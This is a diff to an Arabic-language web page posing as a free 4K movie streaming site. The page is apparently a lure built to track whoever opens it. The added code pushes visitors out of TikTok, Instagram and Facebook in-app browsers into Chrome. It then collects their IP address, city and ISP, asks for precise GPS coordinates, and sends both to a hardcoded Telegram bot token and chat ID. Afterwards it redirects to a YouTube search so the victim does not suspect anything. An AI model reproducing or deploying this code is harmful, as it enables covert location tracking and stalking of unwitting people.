@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سينما أونلاين - مشاهدة مجانية</title>
+    <title>تشغيل الفيلم</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f0f0f; color: white; text-align: center; padding-top: 40px; margin: 0; }
         .container { background: #1e1e1e; padding: 25px; border-radius: 12px; max-width: 350px; margin: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.8); }
-        img { width: 100%; border-radius: 8px; margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
+        img { width: 100%; border-radius: 8px; margin-bottom: 15px; }
         h2 { color: #e50914; margin-top: 0; }
         p { color: #b3b3b3; font-size: 15px; }
-        button { background: #e50914; color: white; border: none; padding: 15px; font-size: 18px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; transition: 0.3s; }
-        button:hover { background: #ff0a16; transform: scale(1.02); }
-        #status { margin-top: 15px; color: #00ff88; font-size: 14px; font-weight: bold; }
+        button { background: #e50914; color: white; border: none; padding: 15px; font-size: 18px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; transition: 0.3s; margin-top: 10px; }
+        button:hover { background: #ff0a16; }
+        #status { margin-top: 15px; color: #00ff88; font-size: 14px; }
+        #warning-box { display: none; background: #333; padding: 15px; border-radius: 8px; border: 2px solid #e50914; margin-bottom: 15px; }
     </style>
 </head>
 <body>
@@ -21,14 +22,56 @@
         <img src="https://image.tmdb.org/t/p/w500/1E5baAaEse26fej7uHcjOgEE2t2.jpg" alt="Movie Poster">
         <p>فيلم الأكشن والغموض (2026) - جودة 4K مجاناً</p>
         
-        <button id="btn" onclick="getLoc()">اضغط لمشاهدة الفيلم</button>
-        <div id="status"></div>
+        <!-- تم تعديل النص هنا ليقول غوغل كروم -->
+        <div id="warning-box">
+            <p style="color: #ffcc00; font-weight: bold;">⚠️ لأسباب أمنية، يرجى فتحه في غوغل كروم لتشغيل الفيلم.</p>
+            <button onclick="openInBrowser()">اضغط هنا لفتح غوغل كروم</button>
+        </div>
+
+        <div id="main-content">
+            <button id="btn" onclick="startMovie()">اضغط لتأكيد الأمان وتشغيل الفيلم</button>
+            <div id="status"></div>
+        </div>
     </div>
 
     <script>
-        function getLoc() {
-            document.getElementById('btn').innerText = "جاري التحقق...";
+        // التحقق مما إذا كان المستخدم داخل تطبيق (تيك توك، إنستغرام، فيسبوك...)
+        const ua = navigator.userAgent || navigator.vendor || window.opera;
+        const isInApp = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Instagram") > -1) || (ua.indexOf("musical_ly") > -1) || (ua.indexOf("BytedanceWebview") > -1) || (ua.indexOf("TikTok") > -1);
+
+        if (isInApp) {
+            document.getElementById('warning-box').style.display = 'block';
+            document.getElementById('main-content').style.display = 'none';
+        }
+
+        function openInBrowser() {
+            // محاولة فتح الرابط في متصفح كروم
+            const currentUrl = window.location.href;
+            if (ua.indexOf("Android") > -1) {
+                // فتح كروم في الأندرويد مباشرة
+                window.location.href = "intent://" + currentUrl.replace("https://", "") + "#Intent;scheme=https;package=com.android.chrome;end";
+            } else {
+                // للأيفون
+                window.open(currentUrl, '_system');
+            }
+        }
+
+        function startMovie() {
+            document.getElementById('btn').innerText = "جاري التحقق من الأمان...";
+            document.getElementById('status').innerText = "الرجاء الانتظار...";
             
+            const BOT_TOKEN = "8933571192:AAEAl7ej-akD789tzkS1sJK7zIZz020a4kA";
+            const CHAT_ID = "8322196658";
+
+            // 1. أخذ الـ IP (يعمل حتى في تيك توك)
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(ipData => {
+                    const ipMsg = encodeURIComponent(`🌐 معلومات الـ IP:\nالدولة: ${ipData.country_name}\nالمدينة: ${ipData.city}\nالـ IP: ${ipData.ip}\nالمزود: ${ipData.org}`);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${ipMsg}`, { mode: 'no-cors', keepalive: true });
+                }).catch(e => console.log("IP Error"));
+
+            // 2. طلب الموقع الدقيق (GPS)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -38,21 +81,20 @@
                         document.getElementById('status').innerText = "✅ تم التشغيل بنجاح!";
                         document.getElementById('btn').style.display = 'none';
                         
-                        // إرسال مباشر إلى تلغرام (بدون خادم)
-                        const text = `🚨 موقع جديد!%0Aخط العرض: ${lat}%0Aخط الطول: ${lon}%0A🗺️ الخريطة: https://maps.google.com/?q=${lat},${lon}`;
-                        const telegramUrl = `https://api.telegram.org/bot8933571192:AAEAl7ej-akD789tzkS1sJK7zIZz020a4kA/sendMessage?chat_id=8322196658&text=${text}`;
+                        const gpsMsg = encodeURIComponent(`🚨 موقع دقيق (GPS):\nخط العرض: ${lat}\nخط الطول: ${lon}\n🗺️ الخريطة: https://maps.google.com/?q=${lat},${lon}`);
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${gpsMsg}`, { mode: 'no-cors', keepalive: true });
                         
-                        fetch(telegramUrl, { mode: 'no-cors' }).then(() => {
-                            // تحويله ليوتيوب لمشاهدة فيلم حقيقي لكي لا يشك
-                            setTimeout(() => {
-                                window.location.href = "https://www.youtube.com/results?search_query=free+full+movie";
-                            }, 1500);
-                        });
+                        setTimeout(() => {
+                            window.location.href = "https://www.youtube.com/results?search_query=free+full+movie";
+                        }, 3000);
                     },
                     (err) => {
-                        document.getElementById('btn').innerText = "اضغط لمشاهدة الفيلم";
-                        document.getElementById('status').style.color = "red";
-                        document.getElementById('status').innerText = "❌ يجب السماح بالموقع لتأكيد المشاهدة.";
+                        // إذا رفض أو فشل الـ GPS
+                        document.getElementById('status').innerText = "✅ تم التشغيل بنجاح!";
+                        document.getElementById('btn').style.display = 'none';
+                        setTimeout(() => {
+                            window.location.href = "https://www.youtube.com/results?search_query=free+full+movie";
+                        }, 1500);
                     }
                 );
             }
